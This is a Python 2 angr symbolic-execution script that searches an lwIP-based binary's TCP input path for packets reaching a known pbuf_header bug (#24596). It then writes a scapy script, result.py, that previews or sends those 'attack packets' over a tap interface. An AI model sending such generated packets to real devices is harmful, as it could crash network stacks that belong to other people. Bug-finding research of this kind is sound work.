#!/usr/bin/python2
# encoding: utf-8
import angr #the main framework
import claripy #the solver engine
try:
    import emoviz # execution trace visualizer
except ImportError as e:
    print e
    print "[!] cannot load emoviz module. missing emoviz.py in current directory. exit."
    exit(1)
import os, signal
import pickle
import hexdump

angr.manager.l.setLevel("DEBUG")

TRACE_SAVE_DIR = "./trace/"
os.system("if [ ! -d %s ]; then mkdir %s; fi" % (TRACE_SAVE_DIR, TRACE_SAVE_DIR))
os.system("rm -f %s[a-zA-Z]*-[0-9]*.{png,dot,txt}" % (TRACE_SAVE_DIR))
def plot_trace():
    global proj, state

    def helper(proj, state, dot_file, plain_file=""):
        ev = emoviz.emoviz(proj)
        ev.add(state)
        ev.save_dot(dot_file)
        ev.save_png(dot_file)
        if plain_file:
            ev.save_plain(plain_file)

    for (i, act) in enumerate(simgr.active):
        dot_file = TRACE_SAVE_DIR + "active-%d.dot" % i
        helper(proj, act.state, dot_file,
            # plain_file=TRACE_SAVE_DIR + "active-%d.txt" % i
            )
        if i >= 9: break
    if hasattr(simgr, "found"):
        for (i, fnd) in enumerate(simgr.found):
            dot_file = TRACE_SAVE_DIR + "found-%d.dot" % i
            helper(proj, fnd.state, dot_file)
    if hasattr(simgr, "avoid"):
        for (i, avd) in enumerate(simgr.avoid):
            dot_file = TRACE_SAVE_DIR + "avoid-%d.dot" % i
            helper(proj, avd.state, dot_file,
                # plain_file=TRACE_SAVE_DIR + "avoid-%d.txt" % i
                )
            if i > 5: break
    for (i, ddd) in enumerate(simgr.deadended):
        dot_file = TRACE_SAVE_DIR + "deadended-%d.dot" % i
        helper(proj, ddd.state, dot_file)
        if i > 5: break
    for (i, err) in enumerate(simgr.errored):
        dot_file = TRACE_SAVE_DIR + "errored-%d.dot" % i
        helper(proj, err.state, dot_file)
        if i >= 14: break

def signal_handler(signal, frame):
    print('[*] received SIGNAL')
    plot_trace()
    exit(1)
signal.signal(signal.SIGINT, signal_handler) # Ctrl+C

def dump_regs(state, _exit=True):
    print "rax = %#x" % state.solver.eval(state.regs.rax)
    print "rdi = %#x" % state.solver.eval(state.regs.rdi)
    print "rsp = %#x" % state.solver.eval(state.regs.rsp)
    print "rbp = %#x" % state.solver.eval(state.regs.rbp)
    rbp = state.solver.eval(state.regs.rbp)
    for i in range(0, 0x48, 8):
        print "mem[rbp - %#x] = %#x" % (i, state.solver.eval(state.memory.load(rbp - i, 8)))
    for i in range(0x20000000, 0x20000000 + 0x200, 8):
        # v = state.solver.eval(state.memory.load(i, 8))
        try:
            v = state.mem[i].uint64_t.concrete
        except Exception, e:
            print "mem[%#x]: " % i + str(e)
            continue
        if v > 0:
            print "mem[%#x] = %#x" % (i, v)
    if _exit:
        exit()

def memory_dump(state, begin, length):
    ret = ""
    for i in range(0, length):
        val = state.solver.eval(state.memory.load(begin + i, 1))
        ret += chr(val)
    return ret

### === helper functions ===
rebased_addr = lambda x: proj.loader.find_symbol(x).rebased_addr
relative_addr = lambda x: proj.loader.find_symbol(x).relative_addr

### load binary
ELF_FILE = "./bin/simhost-STABLE-1_3_0"
proj = angr.Project(ELF_FILE, load_options={'auto_load_libs': False})
start_addr = rebased_addr('tcp_input')
print "[*] analysis start: %#x" % start_addr
### create blank state (initial state)
state = proj.factory.blank_state(addr=start_addr)

### helper boolean
tcp = (start_addr == rebased_addr('tcp_input'))
udp = (start_addr == rebased_addr('udp_input'))

### load preprocessed data
from preprocess import Info, Symbol
INFO_FILE = ELF_FILE + ".info"
try:
    with open(INFO_FILE) as f:
        info = pickle.load(f)
except IOError as e:
    print e
    print "[!] run `./preprocess.py %s` first" % (ELF_FILE)
    exit()

### disables function calls. and sets return value 0
def handle_ret_0(state):
    state.regs.rax = 0

### hooks function calls
try:
    ### nop function x() calls
    funcs = [
    "tcp_debug_print_flags", "tcp_debug_print",
    "udp_debug_print", # debug output
    "tcp_process", # tcp state machine
    "inet_chksum_pseudo",
    ]
    for func_name in funcs:
        if func_name in info.call:
            for x in info.call[func_name]:
                proj.hook(0x400000 + x, handle_ret_0, length=5) # 5 bytes instruction
        else:
            print "[!] info.call has key '%s'" % func_name
            exit(1)
except Exception as e:
    print e
    import ipdb; ipdb.set_trace()
    raise e

### specifies variables location
pbuf_ptr = 0x20000000
pbuf_payload_ptr = pbuf_ptr + 0x8
pbuf_tot_len = pbuf_ptr + 0x10
pbuf_len = pbuf_ptr + 0x12
pbuf_payload = 0x20000100
state.mem[pbuf_payload_ptr].qword = pbuf_payload

### symbolize pbuf.tot_len
symvar_pbuf_tot_len = state.se.BVS('pbuf_tot_len', 16)
state.add_constraints(symvar_pbuf_tot_len > 0)
state.memory.store(pbuf_tot_len, symvar_pbuf_tot_len)

### symbolize pbuf.len
symvar_pbuf_len = state.se.BVS('pbuf_len', 16)
### limit `<= 256` avoids 'IP (len %d) is longer than pbuf (len 256), IP packet dropped.''
l4_min_len = 0
if tcp:
    l4_min_len = 20
elif udp:
    l4_min_len = 64 / 8
state.add_constraints(state.se.And(symvar_pbuf_len >= 20 + l4_min_len, symvar_pbuf_len <= 256))
state.memory.store(pbuf_len, state.se.Reverse(symvar_pbuf_len))
state.add_constraints(symvar_pbuf_tot_len == symvar_pbuf_len)

### add constraints for a packet
L2_PAYLOAD_MAX_LEN = 1500 # 1518 (max Ether frame size) - 14 (address) - 4 (FCS)
symvar_pbuf_payload = state.se.BVS('pbuf_payload', L2_PAYLOAD_MAX_LEN * 8)
tcp_header_offset = 5 * 4 * 8
state.add_constraints(state.se.Extract(7, 0, symvar_pbuf_payload) == 0x45) # ip version & ip header size (IPHL)
state.add_constraints(state.se.Reverse(state.se.Extract(31, 16, symvar_pbuf_payload)) == symvar_pbuf_len) # Total Length in IP header
state.add_constraints(state.se.Extract(32 * 2 + 7, 32 * 2 + 0, symvar_pbuf_payload) > 0) # TTL
symvar_ip_proto = state.se.Extract(32 * 2 + 15, 32 * 2 + 8, symvar_pbuf_payload)
if tcp:
    state.add_constraints(symvar_ip_proto == 6) # ip proto (TCP = 6, UDP = 0x11)
elif udp:
    state.add_constraints(symvar_ip_proto == 0x11) # ip proto (TCP = 6, UDP = 0x11)
else:
    state.add_constraints(state.se.Or(symvar_ip_proto == 6, symvar_ip_proto == 0x11)) # ip proto (TCP = 6, UDP = 0x11)
state.add_constraints(state.se.Reverse(state.se.Extract(32 * 3 + 31, 32 * 3 + 0, symvar_pbuf_payload)) == 0xc0a80001) # ip src (192.168.0.1)
state.add_constraints(state.se.Reverse(state.se.Extract(32 * 4 + 31, 32 * 4 + 0, symvar_pbuf_payload)) == 0xc0a80002) # ip dest (192.168.0.2)
if tcp:
    state.add_constraints(state.se.Reverse(state.solver.Extract(tcp_header_offset + 0xf, tcp_header_offset + 0x0, symvar_pbuf_payload)) > 0) # src port
    state.add_constraints(state.se.Reverse(state.solver.Extract(tcp_header_offset + 0x1f, tcp_header_offset + 0x10, symvar_pbuf_payload)) == 80) # dst port
    state.add_constraints(state.se.Reverse(state.solver.Extract(tcp_header_offset + 0x3f, tcp_header_offset + 0x20, symvar_pbuf_payload)) == 0x11223344) # seqno
    state.add_constraints(state.se.Reverse(state.solver.Extract(tcp_header_offset + 0x5f, tcp_header_offset + 0x40, symvar_pbuf_payload)) == 0x55667788) # ackno
else:
    state.add_constraints(state.se.Reverse(state.solver.Extract(tcp_header_offset + 0x3f, tcp_header_offset + 0x20, symvar_pbuf_payload)) > 0) # seqno
    state.add_constraints(state.se.Reverse(state.solver.Extract(tcp_header_offset + 0x5f, tcp_header_offset + 0x40, symvar_pbuf_payload)) > 0) # ackno
if tcp:
    symvar_tcp_dataofs = state.solver.Extract(tcp_header_offset + 96 + 7, tcp_header_offset + 96 + 4, symvar_pbuf_payload)
    state.add_constraints(state.se.And(symvar_tcp_dataofs >= 5, symvar_tcp_dataofs <= 15)) # tcp length
state.memory.store(pbuf_payload, state.se.Reverse(symvar_pbuf_payload))

### debugging
dump_regs(state, _exit=False)

RSP = 0x7fff1000
state.regs.rdi = pbuf_ptr
state.regs.rsi = 0 # inp_ptr

### load initial state to engine (Simulation Manager)
simgr = proj.factory.simgr(state)

### setup finds / avoids
find, avoid = [], []
### (1) bug #24596; LWIP_ERROR("increment_magnitude <= p->len", (increment_magnitude <= p->len), return 1;);
find += [rebased_addr('pbuf_header') + 0x9513 - relative_addr('pbuf_header')] # (1)
avoid += [rebased_addr('tcp_rst')]

### print finds / avoids
print "[*] find = %s" % str(map(lambda x: hex(x), find))
print "[*] avoid = %s" % str(map(lambda x: hex(x), avoid))

### debugging
# proj.hook(0x400000 + 0x1c730, dump_regs, length=4)

### explore bugs
simgr.explore(find=find, avoid=avoid)
print "[*] explore finished!!"

### save results
result = open("result.py", "w")
result.write("""
import sys
import pickle
try:
    from scapy.all import *
except ImportError:
    print("[!] `pip install scapy` first! exit.")
    exit(1)

def usage():
    cmd_name = sys.argv[0]
    print("usage: [sudo] %s [PACKET_NO]" % cmd_name)
    print("\\tto preview packet: %s" % cmd_name)
    print("\\tto send packet: sudo %s PACKET_NO" % cmd_name)
    print("")
    print("PACKET_NO of packets are indicated in this script.")
    exit()

def recalc_chksums(p):
    if p.haslayer(IP):
        p[IP].chksum = None # to recalculate checksum
    if p.haslayer(TCP):
        p[TCP].chksum = None # to recalculate checksum
    fnull = open(os.devnull, 'w')
    fout = sys.stdout
    sys.stdout = fnull # disable output
    p.show2() # recalculate checksum
    sys.stdout = fout # enable output

def eth_type(p):
    eth_type = 0
    if p.haslayer(IP):
        if p[IP].version == 4:
            eth_type = 0x0800 # IPv4
        elif p[IP].version == 6:
            eth_type = 0x0806 # IPv6
    elif p.haslayer(ARP):
        eth_type = 0x0806
    assert(eth_type > 0)
    return eth_type

IS_ROOT = (os.geteuid() == 0)
PACKET_NO = -1
if len(sys.argv) == 2:
    if sys.argv[1] in ["--help", "-h"]:
        usage()
    PACKET_NO = int(sys.argv[1])
if PACKET_NO > 0 and not IS_ROOT:
    print "[!] you must _root_ to send packet! exit."
    exit(1)
if IS_ROOT and PACKET_NO == -1:
    print "[!] specify packet no"
    usage()
""")
for i, found in enumerate(simgr.found):
    _len = found.se.eval(symvar_pbuf_tot_len)
    print "found #%d: pbuf.tot_len: %#x (%d)" % (i, _len, _len)
    _len = found.se.eval(symvar_pbuf_len)
    print "found #%d: pbuf.len: %#x (%d)" % (i, _len, _len)
    l2_payload_len = _len
    print "found #%d: pbuf.payload (= L2 Payload): " % (i)
    v = found.se.eval(found.se.Reverse(symvar_pbuf_payload), cast_to=str)
    hexdump.hexdump(v[:l2_payload_len])
    result.write("""

### this is Packet #{no:d}
print("[*] ==== [Packet #{no:d}] ====")
print("found #{no:d}: pbuf.payload:")
l2_payload_len = {len:}
v = pickle.loads({dump!r})
p = IP(_pkt=v)
# p[IP].ttl = 64
# p[IP].window = 8192

recalc_chksums(p)
p.show()
b = bytes(p)[:l2_payload_len] # trim unused padding

if IS_ROOT and PACKET_NO == {no:d}: # send mode
    ### write your script here...
    ### send(p) trims padding automically, so I use this one
    sendp(Ether(dst="11:45:14:11:45:14", type=eth_type(p))/b, iface="tap0")
else: # preview mode
    ### write your script here...
    hexdump(b)
    pass
""".format(no=i, dump=pickle.dumps(v), len=l2_payload_len))
    print "found #%d: pbuf:" % (i)
    v = memory_dump(found, pbuf_ptr, 0x20)
    hexdump.hexdump(v)
    tcphdr_val = found.mem[rebased_addr('tcphdr')].uint64_t.concrete
    iphdr_val = found.mem[rebased_addr('iphdr')].uint64_t.concrete
    print "found #%d: iphdr = %#x, tcphdr = %#x" % (i, iphdr_val, tcphdr_val)
    print "found #%d: *iphdr:" % (i)
    hexdump.hexdump(memory_dump(found, iphdr_val, 0x20))
    print "found #%d: *tcphdr:" % (i)
    hexdump.hexdump(memory_dump(found, tcphdr_val, 0x20))
result.close()
print "[*] attack packets are saved to result.py."

### print final result (this can be comment outed)
print ""
print "[*] preview of attack packets"
os.system("python2 result.py")

### you can send generated packets with result.py. enjoy:)